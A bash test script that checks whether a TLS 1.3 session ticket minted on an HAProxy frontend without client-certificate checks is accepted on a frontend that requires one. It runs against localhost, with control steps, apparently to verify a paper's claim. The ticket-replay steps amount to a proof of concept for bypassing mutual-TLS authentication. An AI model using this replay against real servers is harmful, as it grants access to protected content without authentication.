#!/bin/bash
# Does a ticket minted on a frontend that requires NO client certificate resume on a
# frontend that REQUIRES one, in the latest STABLE HAProxy?
# The paper claims the August 2026 series that isolates resumption per authentication
# policy is in no stable release. This tests the behaviour that series changes.
set -u
cd "$(dirname "$0")"
export PATH="/opt/homebrew/bin:$PATH"
rm -f open.sess step*.out
haproxy -f haproxy.cfg -D -p hap.pid 2>/dev/null
sleep 2
say() { printf '\n=== %s ===\n' "$1"; }

echo "HAProxy under test: $(haproxy -v 2>&1 | head -1)"

say "1. CONTROL: protected frontend, full handshake, NO client certificate"
printf 'GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n' \
 | openssl s_client -connect 127.0.0.1:8452 -tls1_3 -CAfile ca.pem -ign_eof > step1.out 2>&1
grep -q "PROTECTED-FRONTEND" step1.out \
  && echo "    SERVED without a client certificate  <-- control FAILED, test invalid" \
  || echo "    refused, as it must be"

say "2. mint a ticket on the OPEN frontend (no client certificate requested)"
printf 'GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n' \
 | openssl s_client -connect 127.0.0.1:8451 -tls1_3 -CAfile ca.pem \
   -sess_out open.sess -ign_eof > step2.out 2>&1
grep -q "OPEN-FRONTEND" step2.out && echo "    open frontend served" || echo "    open frontend did NOT serve"
[ -s open.sess ] && echo "    ticket saved ($(wc -c < open.sess | tr -d ' ') bytes)" || echo "    NO TICKET"

say "3. THE TEST: replay that ticket on the PROTECTED frontend"
printf 'GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n' \
 | openssl s_client -connect 127.0.0.1:8452 -tls1_3 -CAfile ca.pem \
   -sess_in open.sess -ign_eof > step3.out 2>&1
grep -qE '^Reused, ' step3.out && echo "    session reused by the TLS layer: yes" \
                               || echo "    session reused by the TLS layer: no"
grep -q "PROTECTED-FRONTEND" step3.out \
  && echo "    RESULT: VULNERABLE. Protected content served to a party that never authenticated." \
  || echo "    RESULT: not served."

say "4. CONTROL: replay the SAME ticket back on the OPEN frontend"
printf 'GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n' \
 | openssl s_client -connect 127.0.0.1:8451 -tls1_3 -CAfile ca.pem \
   -sess_in open.sess -ign_eof > step4.out 2>&1
grep -qE '^Reused, ' step4.out \
  && echo "    ticket RESUMED at its own frontend, so it was valid and offerable" \
  || echo "    ticket did NOT resume even at its own frontend  <-- control FAILED"

[ -f hap.pid ] && kill "$(cat hap.pid)" 2>/dev/null; rm -f hap.pid
